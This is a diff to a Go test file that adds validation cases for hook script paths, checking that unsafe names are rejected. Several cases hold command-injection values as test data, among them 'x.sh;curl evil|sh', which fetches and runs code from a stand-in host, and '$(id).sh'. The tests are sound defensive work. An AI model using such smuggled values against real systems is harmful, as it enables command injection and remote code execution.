@@ -60,6 +60,30 @@ func TestValidateSettingsBlocks(t *testing.T) {
 		{"script may not escape", func(c *Config) {
 			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "../x.sh"}}}}
 		}, "unsafe script"},
+		{"valid script path", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "scripts/guard-1_a.b.sh"}}}}
+		}, ""},
+		{"script with a space", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "scripts/a b.sh"}}}}
+		}, "may only contain"},
+		{"script with a command separator", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "x.sh;curl evil|sh"}}}}
+		}, "may only contain"},
+		{"script with a command substitution", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "$(id).sh"}}}}
+		}, "may only contain"},
+		{"script with a backtick", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "`id`.sh"}}}}
+		}, "may only contain"},
+		{"script with a quote", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "a'b.sh"}}}}
+		}, "may only contain"},
+		{"script with a newline", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "a.sh\nid"}}}}
+		}, "may only contain"},
+		{"script with a backslash", func(c *Config) {
+			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: `a\b.sh`}}}}
+		}, "may only contain"},
 		{"unknown target", func(c *Config) {
 			c.Hooks = []HookGroup{{Event: "Stop", Targets: []string{"vim"}, Hooks: []HookAction{{Command: "a"}}}}
 		}, "unknown harness"},
